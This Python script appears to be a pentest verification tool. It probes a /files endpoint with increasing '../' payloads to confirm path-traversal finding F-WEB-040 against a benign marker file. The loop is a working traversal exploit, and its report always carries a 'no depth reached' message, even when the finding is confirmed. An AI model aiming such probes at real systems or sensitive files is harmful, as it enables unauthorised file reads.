#!/usr/bin/python3
"""Prove F-WEB-040 has escaped the web root, against the benign marker only.

The estate carries a harmless proof file outside the served directory for this
exact purpose. Reaching it, and matching its known content, is the evidence the
root was escaped. Nothing sensitive is read: the stop is the marker.
"""
import argparse
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

try:
    import requests
except ImportError:  # the lab box may not ship it
    requests = None


def fetch(url, params=None, data=None, method="GET", session=None, timeout=8):
    """One place where the HTTP work happens: requests when present, urllib
    otherwise. Returns (status, headers, body) or (None, {}, reason)."""
    if requests is not None:
        try:
            client = session or requests
            response = client.request(
                method, url, params=params, data=data, timeout=timeout
            )
            return response.status_code, dict(response.headers), response.text
        except Exception as exc:
            return None, {}, str(exc)
    query = ""
    if params:
        query = "?" + urllib.parse.urlencode(params)
    payload = urllib.parse.urlencode(data).encode() if data else None
    request = urllib.request.Request(url + query, data=payload, method=method)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            return (
                response.status,
                dict(response.headers),
                response.read().decode("utf-8", "replace"),
            )
    except urllib.error.HTTPError as exc:
        return (
            exc.code,
            dict(exc.headers or {}),
            exc.read().decode("utf-8", "replace"),
        )
    except (urllib.error.URLError, TimeoutError, OSError, ValueError) as exc:
        return None, {}, str(exc)


def emit(result):
    if result.get("verdict") == "unconfirmed" and "to_settle" not in result:
        result["to_settle"] = "the live behaviour did not settle the claim"
    print(json.dumps(result, indent=2))


ENDPOINT = "/files"
MARKER = "HALCYON-TRAVERSAL-PROOF"
PROOF_FILE = "proof_marker.txt"


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=True)
    parser.add_argument("--param", default="file")
    args = parser.parse_args()
    base = args.target.rstrip("/")

    evidence = {
        "request_param": "not built",
        "content_match": False,
        "marker": MARKER,
    }
    verdict = "unconfirmed"

    for depth in range(1, 9):
        payload = "../" * depth + PROOF_FILE
        status, _, body = fetch(base + ENDPOINT, {args.param: payload})
        if status is None:
            evidence["error"] = body
            break
        if MARKER in body:
            verdict = "confirmed"
            evidence["request_param"] = "%s=%s" % (args.param, payload)
            evidence["content_match"] = True
            evidence["http_status"] = status
            break

    emit(
        {
            "finding": "F-WEB-040",
            "class": "path_traversal",
            "verdict": verdict,
            "evidence": evidence,
            "stopped_at": "root escaped to the benign marker; no sensitive "
            "file read",
            "to_settle": "no traversal depth reached the proof file",
        }
    )


if __name__ == "__main__":
    main()
